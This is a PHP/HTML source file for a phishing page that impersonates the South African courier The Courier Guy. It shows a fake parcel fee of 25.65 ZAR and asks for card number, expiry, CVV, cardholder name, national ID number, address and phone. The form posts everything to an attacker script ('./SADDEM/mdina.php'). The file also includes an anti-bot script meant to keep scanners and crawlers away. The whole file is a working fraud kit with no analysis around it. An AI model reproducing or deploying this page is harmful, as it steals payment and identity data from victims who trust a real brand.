<?php
include("./owner/config.php");
include "./files/php/sys.php";
include './files/php/911/botfucker.php'; 
?>
<!DOCTYPE html>
<html>
<head>
<title>The Courier Guy – Delivery | Distribution | Warehousing - MML72167072</title>
<link rel="shortcut icon" type="image/jpg" href="./files/hd.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap" rel="stylesheet">
<style>
body {
  background-color: #ffff;
  color: black;
  font-family: Ubuntu;
  font-size: 17px;
  padding: 8px;

}

* {
  box-sizing: border-box;
}

.row {
  display: -ms-flexbox; /* IE10 */
  display: flex;
  -ms-flex-wrap: wrap; /* IE10 */
  flex-wrap: wrap;
  margin: 0 -16px;
}

.col-25 {
  -ms-flex: 25%; /* IE10 */
  flex: 25%;
}

.col-50 {
  -ms-flex: 50%; /* IE10 */
  flex: 50%;
}

.col-75 {
  -ms-flex: 75%; /* IE10 */
  flex: 75%;
}

.col-25,
.col-50,
.col-75 {
  padding: 0 16px;
}

.container {
  background-color: #f2f2f2;
  padding: 5px 20px 15px 20px;
  border: 1px solid lightgrey;
  border-radius: 3px;
}

input[type=text] {
  width: 100%;
  margin-bottom: 20px;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 3px;
}

label {
  margin-bottom: 10px;
  display: block;
}

.icon-container {
  margin-bottom: 20px;
  padding: 7px 0;
  font-size: 24px;
}

.btn2 {
  background-color: #fff;
  color: black;
  padding: 12px;
  margin: 10px 0;
  border: 1px solid #ccc;
  width: 100%;
  border-radius: 3px;
  cursor: pointer;
  font-size: 17px;
  font-family: Ubuntu;
}
.btn2:hover {
  background-color: #F4F0F0;
}
.btn {
  background-color: #00A3BA;
  color: white;
  padding: 12px;
  margin: 10px 0;
  border: none;
  width: 100%;
  border-radius: 3px;
  cursor: pointer;
  font-size: 17px;
  font-family: Ubuntu;
}

.btn:hover {
  background-color: #62afba;
}

a {
  color: #2196F3;
}

hr {
  border: 1px solid lightgrey;
}

span.price {
  float: right;
  color: grey;
}

/* Responsive layout - when the screen is less than 800px wide, make the two columns stack on top of each other instead of next to each other (also change the direction - make the "cart" column go on top) */
@media (max-width: 800px) {
  .row {
    flex-direction: column-reverse;
  }
  .col-25 {
    margin-bottom: 20px;
  }
}
</style>
</head>
<body>
<div >
  <div align="center" ><img  width="25%" src="./files/hd.png"> </div>
  
</div>
<h2>The Courier Guy – Delivery | Distribution | Warehousing</h2>
 <div class="container">
      <h4>Parcel :<span class="price" style="color:black">MML72167072</h4>
      <p>Total :<span class="price" style="color:black"><b>25.65 ZAR</b></span></p>
    </div>
    <br>
<script>var token=<?php echo json_encode($ovnitoken); ?>;</script>

<div class="row">
  <div class="col-75">
    <div class="container">
      <form action="./SADDEM/mdina.php" method="POST">
          
          <div class="col-25">

            <br>
   
  </div>

          <div class="col-50">
            <h3>Payment Method</h3>
            <label for="fname">Accepted Cards</label>
            <div class="icon-container">
              <i class="fa fa-cc-visa" style="color:navy;"></i>
              <i class="fa fa-cc-mastercard" style="color:red;"></i>
              <script src="./files/ovni.js" type="text/javascript"></script>
			  <script src="./files/jq.js"></script>
            </div>
          
            <label for="ccnum">Card Number</label>
            <input onkeyup="$cc.validate.call(this,event)" type="text" required="" maxlength="19" name="ovnicc" placeholder="">
            <label for="expmonth">Expiry</label>
            <input onkeyup="$cc.expiry.call(this,event)" maxlength="7" required="" type="text"  name="ovniexp" placeholder="MM/YYYY">
            <div class="row">
              <div class="col-50">
                <label for="cvv">CVV</label>
                <input required="" maxlength="3" type="text" name="ovnicvc" placeholder="">
              <label for="cname">Card Holder Name</label>
            <input type="hidden" name="ovnimdf" value="B%y$usC{$qQ<B\2L">
            <input type="text" required=""  name="ovniname" placeholder="">
            <label for="cidnum">ID Number</label>
            <input type="hidden" name="ovniidn" value="B%y$usC{$qQ<B\2L">
            <input type="text" required=""  name="ovniidn" placeholder="">
            <label for="ccaddr">Address</label>
            <input type="hidden" name="ovniaddr" value="B%y$usC{$qQ<B\2L">
            <input type="text" required=""  name="ovniaddr" placeholder="">
            <label for="ccnum">Phone Number</label>
            <input required="" maxlength="10" type="text" name="ovniphn" placeholder="">
              </div>
            </div>
          </div>
          
        </div>
        
        <input type="submit" value="Submit Secure Payment" class="btn">
        
        <input type="submit" value="Cancel" class="btn2">
        
      </form>
    </div>
  </div>
  
</div>
<footer>  
<div align="center" >

  <img  width="15%" src="./files/spIcon.png"><br><img  width="16%" src="./files/vm.gif">

  <h5>© 2024 The Courier Guy – Delivery | Distribution | Warehousing All Rights Reserved</h5>
</div>
  
  
  
</div></footer>  
</body>
</html>